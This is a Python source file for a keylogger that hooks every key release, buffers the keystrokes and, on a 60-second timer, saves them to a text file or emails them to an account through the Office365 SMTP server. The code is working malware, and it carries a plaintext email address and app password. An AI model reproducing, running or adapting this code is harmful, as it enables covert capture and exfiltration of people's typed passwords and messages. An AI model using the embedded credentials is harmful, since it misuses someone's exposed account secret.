import keyboard
from datetime import datetime
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib


SEND_REPORT_EVERY=60
EMAIL_ADDRESS="safarayussif@gmail.com"
EMAIL_PASSWORD="aprv lmjm aoda ckkj"

class Keylogger:
    def __init__(self,interval, report_method="file"):
        self.interval=interval
        self.report_method=report_method
        self.log=""
        self.start_dt=datetime.now()
        self.end_dt=datetime.now()
    def Call_back(self,event):
        name=event.name
        if len(name) >1:
            if name == "space":
                name=" "
            elif name == "enter":
                name == "[Enter]\n"
            elif name=="decimal":
                name="."
            else:
                name=name.replace(" ","_")
            name=f"[{name.upper()}]"
        self.log +=name

    #Reporting to Text File
    def update_filename(self):
        start_dt_str= str(self.start_dt)[:-7].replace(" ","-").replace(":","")
        end_dt_str=str(self.start_dt)[:-7].replace(" ","-").replace(":","")
        self.filename= f"Keylog-{start_dt_str}__{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt","w") as f:
            print(self.log,file=f)
            print(f"[+] Saved {self.filename}.txt")

    #Reporting via Email
    def prepare_email(self,message):
        msg=MIMEMultipart("alternative")
        msg['From']=EMAIL_ADDRESS
        msg['To']=EMAIL_ADDRESS
        msg['subject']="keylogger logs"
        html=f"<p> {message} </p>"
        text_part=MIMEText(message,'plain')
        html_part=MIMEText(html, 'html')
        
        msg.attach(text_part)
        msg.attach(html_part)
        
        return msg.as_string()
    def Sendmail(self,email,password,message,verbose=1):
         # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        with smtplib.SMTP("smtp.office365.com",587) as server:
            server.starttls()
            server.login(email,password)
            server.sendmail(email,email,self.prepare_email(message))
            #The first email is your email and the second one is the receipient email
            server.quit()
            if verbose:
                print(f"{datetime.now()}-sent to {email} containing :{message}")

    def report(self):
        if self.log:
            self.end_dt=datetime.now()
            self.update_filename()
            if self.report_method== "email":
                self.Sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.log)
            elif self.report_method=="file":
                self.report_to_file()
                print (f"[{self.filename}]-{self.log}")
            self.start_dt=datetime.now()
        self.log=""
        timer=Timer(interval=self.interval,function=self.report)
        timer.deamon=True
        timer.start()
        
    def start(self):
        self.start_dt=datetime.now()
        keyboard.on_release(callback=self.Call_back)
        self.report()
        print (f"{datetime.now}------keylogger has started")
        keyboard.wait()

if __name__=="__main__":
    keylogger=Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
    keylogger.start()